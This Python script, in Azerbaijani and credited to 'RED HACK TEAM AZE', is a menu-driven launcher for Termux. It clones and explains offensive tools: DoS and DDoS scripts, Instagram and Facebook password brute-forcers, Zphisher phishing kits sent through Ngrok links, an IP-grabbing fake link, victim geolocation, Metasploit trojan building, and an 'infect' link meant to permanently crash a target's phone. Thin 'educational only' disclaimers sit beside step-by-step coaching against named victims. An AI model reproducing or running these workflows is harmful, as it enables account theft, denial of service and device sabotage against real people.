#!/usr/bin/env python3

import os
os.system("clear")
os.system("figlet R.H.A-TOOL")
print("                                               v0.5")
print(" 	===RED HACK TEAM AZE _ R.H.A===")
print("     >>DΞLTΛ29.exe Tərəfindən Kodlanmışdır<<")
print("Yeni Baslayanlar Ucun En Cox Istifade Olunan Tool-lar")
print("""
Tool-la işə başlamazdan əvvəl, paketləri yükləyin
Paketləri yükləmək üçün,"paketler" yazmağınız kifayətdir
Bunu her defe tool-a giris edende yeniden tekrarlamaniz
Eslinde daha yaxsi olar, cunku Termux guncellenir :)
Daha Etrafli Melumati Secim-e "haqqinda" yazaraq
Elde ede bilersiniz.
""")
print("""[haqqinda] Tool Haqqında Məlumat
------------------------------------------------------
        	      > sayt < :
[1] Hədəf Saytın IP Adressini tap :
[2] Hədəf Sayt Haqqında Ümumi Məlumat :
[3] Sadə Port Skanı :
[4] Saytda SQL açığı skanı :
[5] Sayta hücum !!!
 a) DOS Attack 	 b) DDOS Attack
[6] RED-HAWK Tool-u
(ikinci secimin daha genis formasi)
[7] WordPress Scan
------------------------------------------------------
		> Sosial Medyalar üçün < :
    -◇-İnstagram : BruteForce Attack, Phishing-◇-
[BI] Instagram üçün Brute-Force Attack
[PI] Instagram üçün Phishing
   -◇-FaceBook : BruteForce Attack, OSIF, Phishing-◇-
[BF] FaceBook üçün Brute-Force
[PF] FaceBook üçün Phishing
[O] OSIF
------------------------------------------------------
		   > Nömrə Skanı <
[PHI] PhoneInfoga toolu vasitəsile
------------------------------------------------------
       > Hədəf Şəxsin IP adresinin tapılması <
[FL] Fake link vasisəsilə
------------------------------------------------------
    > IP adressdən məkan/lokasiyanın tapılması <
[IPG] IpGeoLocation toolu vasitəsilə
------------------------------------------------------
         > Hədəf Şəxsin Telefonuna Sızma <
[T] Trojan ilə (metasploit)
------------------------------------------------------
     > Hədəf Şəxsin Telefonunun Çökdürülməsi <
[InF] Infect toolu vasitəsilə
------------------------------------------------------
""")
print("Seçimi qeyd edin")
command = input("R.H.A-TOOL ==> ")

if command=="nano" or command=="nano r.h.a-tool.py":
	os.system("exit")
	os.system("nano r.h.a-tool.py")
elif command=="1":
	print("""
Hedef Saytin IP adresini sayti PING-lemek yolu ile tapiriq.
Indi size verilen yere saytin adini yazacaqsiniz.
Sonra ise, Saytin IP adressi belli olduqdan sonra,
CTRL ile C - ye basib komandani dayandiracaqsiniz:)
""")
	hedefip=input("Hədəf saytı qeyd edin:(məs. www.google.com) : ")
	os.system("ping "+hedefip)
elif command=="2":
	print("NMAP ile sayt skani")
	hedefip=input("Hədəf saytı yazın:")
	os.system("nmap "+hedefip)
elif command=="3":
	print("""
Bu secim size saytdaki portlari
ve versiyalari gosterir.
""")
	hedefip=input("Hədəf saytı girin:")
	os.system("nmap -sV "+hedefip)
elif command =="4":
	os.system("git clone https://github.com/sqlmapproject/sqlmap")
	os.system("clear")
	print("""
Bu skan SQLMAP tool-u ile edilir.
R.H.A-TOOL SqlMap-i sizin Termuxa yukleyib ;),
Saytda SQL açığı axtarmaq üçün 'sqlmap' tooluna -
cd sqlmap | yazaraq daxil olub,
saytı skanlamağınız kifayətdir.
Misal üçün :
python sqlmap.py -u www.google.com
""")
	secim=input("R.H.A-Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç yazın : ")
	if secim=="Q" or secim=="q":
		os.system("python3 r.h.a-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır.")
		quit()
elif command=="5":
	variant=input("Variantı daxil edin : ")
	if variant=="A" or variant=="a":
		os.system("clear")
		os.system("cowsay DOS Toolu yüklənir")
		os.system("git clone https://github.com/Quitten/doser.py")
		os.system("clear")
		os.system("cowsay DOS Toolu yükləndi")
		print("""
Yalniz maariflendirici esaslar daxilindedir ;)
Toola daxil olub, help menyusundan necə işlədilə
Biləcəyini öyrənə bilərsiniz.
""")
		secim=input("R.H.A-Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç yazın : ")
		if secim=="Q" or secim=="q":
			os.system("python3 r.h.a-tool.py")
		elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
			print("Hələlik")
			quit()
	elif variant=="B" or variant=="b":
		os.system("clear")
		os.system("cowsay Planetwork-DDOS Toolu yüklənir..")
		os.system("git clone https://github.com/Hydra7/Planetwork-DDOS")
		os.system("clear")
		os.system("cowsay Planerwork-DDOS Toolu yükləndi")
		print("""
Yalniz Maariflendirici Esaslar Daxilindedir ;)
cd Planetwork-DDOS | yazaraq
Planetwork-DDOS tooluna girib,
python2 pntddos.py yazmaqla toolu aktivləşdirə bilərsiniz.
DDOS hücumu üçün;
python2 pntddos.py <hədəf saytın IP adresi> 80 10
Yazmaq kifayətdir ;)
Hədəf Saytın IP adresini "1)"-ci üsulla tapa bilərsiniz.
""")
		secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç yazın : ")
		if secim=="Q" or secim=="q":
			os.system("python3 r.h.a-tool.py")
		elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
			print("Hələlik")
			quit()
	else:
		print("""Yuxarida Qeyd olunan A ve ya B variantlarindan
Birini Daxil ede bilersiniz.
""")
		secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç  yazın : ")
		if secim=="Q" or secim=="q":
			os.system("python3 r.h.a-tool.py")
		elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
			print("Hələlik..")
			quit()
		else:
			print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır.")
elif command=="6":
	os.system("clear")
	os.system("cowsay RED-HAWK tool-u yuklenir...")
	os.system("git clone https://github.com/Tuhinshubhra/RED_HAWK")
	os.system("cowsay RED_HAWK toolu hazirdir.")
	print("""
Toolu ishlek veziyyete salmaq ucun,
Tool-a girib ;
chmod 777 rhawk.php
Sonra ise ;
php rhawk.php
Yazmaginiz kifayetdir ;)
""")
	secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç  yazın : ")
	if secim=="Q" or secim=="q":
		os.system("python3 r.h.a-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
elif command=="7":
	os.system("clear")
	os.system("cowsay D-TECT Toolu yuklemededir :) ")
	os.system("git clone https://github.com/shawarkhanethicalhacker/D-TECT-1.git")
	os.system("clear")
	os.system("cowsay D-TECT tool-u yuklenmisdir")
	print("""
Bu Tool size WordPress ile yaradilan
Saytlari skanlamaga komek edecek.
""")
	secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç  yazın : ")
	if secim=="Q" or secim=="q":
		os.system("python3 r.h.a-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Helelik :)")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
		quit()
elif command=="BI" or command=="bi" or command=="Bİ":
	os.system("clear")
	os.system("cowsay Instagram üçün Brute Force Toolu yüklənir")
	os.system("git clone https://github.com/noob-hackers/ighack")
	os.system("clear")
	os.system("cowsay Wordlist üçün Cupp toolu yüklənir")
	os.system("git clone https://github.com/Mebus/cupp")
	os.system("clear")
	print("""
Bruteforce üçün əvvəlcə Cupp ilə
şəxsə özəl Wordlist hazırlayın,
Sonra isə "ighack" tooluna daxil olub,
"Manual" seçin,
Hesabı və wordlisti qeyd etdikdən sonra,
Attack başlayacaqdır """)
	os.system("cowsay Uğurlar!")
	secim=input("Tool-a qayıtmaq üçün Q, çıxmaq üçün Ç yazın : ")
	if secim=="Q" or secim=="q":
		os.system("python3 r.h.a-tool.py")
	elif secim=="Ç" or seçim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
elif command=="PI" or command=="pi" or command=="Pİ":
	os.system("clear")
	os.system("cowsay Phishing üçün Zphisher toolu yüklənir..")
	os.system("git clone https://github.com/htr-tech/zphisher")
	os.system("clear")
	print("""
Phishing üçün əvvəlcə Zphisher tooluna daxil olun,
Sonra isə Instagram-ı seçin.
Gələn seçimlərdən hər hansı birini seçin.
Link-i "Ngrok" vasitəsilə yaradın.
Sonra isə, hədəf şəxsə atıb sayta girməyini gözləyin.
Və məlumatlar sizdədir.
""")
	os.system("cowsay Uğurlar!")
	secim=input("Tool-a qayıtmaq üçün Q, çıxmaq üçün Ç seçin: ")
	if secim=="Q" or secim=="q":
		os.system("python3 r.h.a-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tooldan çıxılır")
elif command=="BF" or command=="bf":
	os.system("clear")
	os.system("cowsay FaceBook üçün Brute Force Toolu yüklənir..")
	os.system("git clone https://github.com/Gameye98/FBBrute")
	os.system("clear")
	print("""
Əvvəlcə "Cupp" toolu ilə şəxsə özəl Wordlist yaradın,
Sonra isə "FBBrute" tooluna daxil olub,
python fbbrute.py yazaraq aktivləşdirin.
Daha sonrasında hesabla Wordlisti seçin,
və attack-ı başladın.
""")
	os.system("cowsay Uğurlar!")
	secim=input("Tool-a qayıtmaq üçün Q, Çıxmaq üçün Ç seçin: ")
	if secim=="Q" or secim=="q":
		os.system("python3 r.h.a-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələliikk..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
elif command=="PF" or command=="pf":
	os.system("git clone https://github.com/htr-tech/zphisher")
	os.system("clear")
	print("""
Phishing üçün, Zphisher Tooluna daxil olun,
Sonra FaceBook-u seçin.
Gələn variantlardan hər hansı birini seçin.
Link-i "Ngrok"la yaradın.
Sonra isə hədəf şəxsə atıb məlumatları girməyini
"sağlayın" :D
""")
	os.system("cowsay Uğurlar!")
	secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç seçin: ")
	if secim=="Q" or secim=="q":
		os.system("python3 r.h.a-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
elif command=="O" or command=="o":
	os.system("clear")
	os.system("cowsay OSIF Yüklənir...")
	os.system("git clone https://github.com/ciku370/OSIF")
	os.system("clear")
	os.system("cowsay OSIF Yükləndi..")
	print("""
Toolu işlək vəziyyətə salmaq üçün:
pip2 install -r requirements.txt
Sonra isə;
python2 osif.py -yazaraq toola giriş edə bilərsiniz.
""")
	os.system("cowsay uğurlar!")
	secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç seçin: ")
	if secim=="Q" or secim=="q":
		os.system("python3 r.h.a-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("hələlik:)")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
elif command=="PHI" or command=="phi" or command=="PHİ":
	os.system("clear")
	os.system("cowsay PhoneInfoga toolu yüklənir :) ")
	os.system("apt-get install wget tar")
	os.system("wget https://github.com/sundowndev/phoneinfoga/releases/download/v2.3.8/PhoneInfoga_Linux_arm64.tar.gz")
	os.system("clear")
	os.system("cowsay Tool Hazırdır")
	print("""
PhoneIngoga Tool-una giriş etmək üçün :
1 - ls
2 - tar xvf PhoneInfoga_Linux_arm64.tar.gz
Bunu sadəcə tool-a ilk dəfə giriş edəndə yazmalısınız
Daha sonraki girişlərdə isə Tool-u istifadə etmək üçün,
./phoneinfoga
Yazmağınız kifayətdir. Hər Hansı bir nömrəni skan
Etmək üçün :
./phoneinfoga scan -n <hədəf şəxsin telefon nömrəsi>
""")
	os.system("cowsay Uğurlar!")
	secim=input("Toola qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç seçin: ")
	if secim=="Q" or secim=="q":
		os.system("python3 r.h.a-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("HƏLƏLİK..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
elif command=="FL" or command=="fl":
	os.system("cowsay Aşağını Oxu..")
	print("""
İnstagram/Facebook phishing ilə eyni məntiqdir.
Sosyal Mühəndislik.
Zatən hədəf şəxs sizin ona göndərdiyiniz
sayta giriş edəndə,
IP Adresi ekranda yazılır. Bu qədər..
""")
	os.system("cowsay İndi isə Zphisher Tooluna gedib hər hansi bir linki hədəf şəxsə atmalısan. Uğurlar!")
	secim=input("Tool-a qayıtmaq üçün Q, Çıxmaq üçün Ç seçin: ")
	if secim=="Q" or secim=="q":
		os.system("python3 r.h.a-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Uğurlar")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz Tool-dan çıxılır")
elif command=="IPG" or command=="ipg" or command=="İPG":
	os.system("clear")
	os.system("cowsay IpGeoLocation toolu yüklənir...")
	os.system("git clone https://github.com/maldevel/IPGeoLocation")
	os.system("clear")
	os.system("cowsay IPGeolocation toolu yüklənmişdir..")
	print("""
Toolun aktivləşdirilməsi üçün:
 cd IPGeoLocation && pip install -r requirements.txt
 chmod 777 ipgeolocation.py
 python ipgeolocation.py
Yazmalisiniz ;
  Öz IP adresinizi/yerinizi görmək üçün :
python ipgeolocation.py -m
  Hədəf şəxsin IP adresindən yerini öyrənmək üçün :
--(((Zphisher toolundan IP-ni götürürdük..)))
python ipgeolocation.py -t <hədəf şəxsin ip-si>
""")
	os.system("cowsay Bu Qədər Uğurlar!")
	secim=input("Toola qayıtmaq üçün Q, çıxmaq üçün Ç seçin: ")
	if secim=="Q" or secim=="q":
		os.system("python3 r.h.a-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
elif command=="T" or command=="t":
	os.system("cowsay yükləmə başladılır")
	print("""
Yüklənilən Tool Metasploiti qurmağa kömək edir..
""")
	os.system("git clone https://github.com/jokzilla/metakurucu.git")
	os.system("clear")
	os.system("cowsay Metakurucu Toolu yüklənmişdir")
	print("""
Metasploiti qurmaq üçün,
Metakurucu tooluna daxil olub,
 chmod +x *
 bash metakurucu.sh
Yazmaq kifayətdir. Tool özü Metasploiti quracaqdır,
Siz sadəcə gələn suallarda "Y" basın, yəni təsdiq edin.
internet sürətindən asılı olaraq, max.20 dəqiqəyə
Metasploit qurulacaq.
Sonra isə, Termuxdan çıxıb yenidən giriş edin,
"ls" yazıb ekrana çıxan toollara baxın.
cd metasploit-framework
./msfconsole
Yazaraq konsol ekranına daxil ola ;
./msfvenom
Yazaraq trojan making ekranına gələ bilərsiniz.
""")
	os.system("cowsay Uğurlar!")
	secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç  yazın : ")
	if secim=="Q" or secim=="q":
		os.system("python3 r.h.a-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır.")
elif command=="InF" or command=="inf" or command=="İNF":
	os.system("clear")
	os.system("cowsay Infect toolu yüklənir..")
	os.system("git clone https://github.com/noob-hackers/infect")
	os.system("clear")
	os.system("cowsay Infect toolu yüklənmişdir")
	print("""
Toola girmək üçün:
cd infect
chmod 777 infect.sh
bash infect.sh
1-infect now seçilir
--------------------
Gələn link-i hədəf şəxsə göndərib sənədi yükləməyini istəyirik,
Sosyal Mühəndislik lazımdır.
Hədəf şəxs sənədi yükləyib açanda, telefona Elite virusu düşür
və Android/IOS sistemi çökür.
Telefon bir daha açılmır.
Hər şey sizin öz mesuliyyetiniz daxilindədir,
yaradıcı heç bir məsuliyyət daşımır!!
""")
	secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç  yazın : ")
	if secim=="Q" or secim=="q":
		os.system("python3 r.h.a-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır.")
elif command=="Paketler" or command=="paketler":
	os.system("clear")
	os.system("cowsay Paketlər yüklənirrrr..")
	print("""
bunun ucun telefonunuzda / cihazinizda
5 GB-a qeder bos yer olmalidir.
""")
	os.system("apt install git -y")
	os.system("apt install python -y")
	os.system("apt install python2 -y")
	os.system("apt install python3 -y")
	os.system("apt install busybox -y")
	os.system("apt install cmatrix -y")
	os.system("apt install dnsutils -y")
	os.system("apt install hashdeep -y")
	os.system("apt install nmap -y")
	os.system("apt install hydra -y")
	os.system("apt install pip")
	os.system("apt install pip")
	os.system("apt install pip2")
	os.system("apt install vim -y")
	os.system("apt install cat -y")
	os.system("apt install lolcat -y")
	os.system("apt install netcat -y")
	os.system("apt install ninja -y")
	os.system("apt install figlet -y")
	os.system("apt install toilet -y")
	os.system("apt install cowsay -y")
	os.system("apt install openssl -y")
	os.system("apt install php -y")
	os.system("apt install clang -y")
	os.system("apt install curl -y")
	os.system("pip install wordlist")
	os.system("apt install nodejs -y")
	os.system("apt install tor -y")
	os.system("apt update -y")
	os.system("apt upgrade -y")
	os.system("apt update -y")
	os.system("clear")
	os.system("python3 r.h.a-tool.py")
elif command=="Haqqinda" or command=="Haqqında" or command=="haqqinda" or command=="haqqında":
	os.system("clear")
	print("""
			>>>RED HACK TEAM AZE<<<
		   □-□-■-■-□-□-R.H.A-TOOL-□-□-■-■-□-□
			Kodlayan - DΞLTΛ29.exe
	     Ən çox istifadə olunan əməliyyatlar bir Toolda.
		       İnkişaf mərhələsindədir.
	 -------------------------------------------------------
			 Yaradıcı ilə əlaqə :
		      Instagram : delta29exe
		        Telegram : delta29exe
		     Gmail : delta29exe@gmail.com

     ~~> İradlar, suallar və təkliflər üçün əlaqə saxlaya bilərsiniz
     ----------------------------------------------------------------
Tool-un işləməsi üçün lazım olan paketlər:

	pkg install git
	pkg install python
	pkg install python3
	pkg install figlet
	pkg install cowsay

----------------------------------------------------------------------
Tool, DΞLTΛ29.exe tərəfindən kodlanmışdır,
Termux-a yeni baslamisinizsa, size cox komeyi deyecek :)
----------------------------------------------------------------------
Tool sadəcə praktika məqsədli yazılmışdır,
əlavə məqsədlərlə istifadəsi (kiməsə zərər məqsədli və s.) qadağandır,
Əlavə məqsədlərlə istifadə olunduğu təqdirdə,
RED HACK TEAM AZE heç bir məsuliyyət daşımır !!!!!
----------------------------------------------------------------------
Ola Bilsin Ki, Yuklenen Bezi Tool-lar Islemir,
Ya da kohnelib, yeni versiyasina guncellemek lazimdir.
Bele olduqda Yaradici ile Elaqe Saxlayaraq Bildirmeyiniz Xahis olunur.
Umumiyyetle, R.H.A-TOOL-dan isttifade ucun,
Cihazinizda 5 GB-a qeder bos yer olmalidir.
[ RED HACK TEAM AZE _ RESPECT ]
""")
	secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç  yazın : ")
	if secim=="Q" or secim=="q":
		os.system("python3 r.h.a-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır.")
elif command=="EXIT" or command=="Exit" or command=="exit":
	os.system("clear")
	os.system("cowsay Hələlik ..")
	quit()
else:
	print("Secimi duzgun yazin")
	quit()

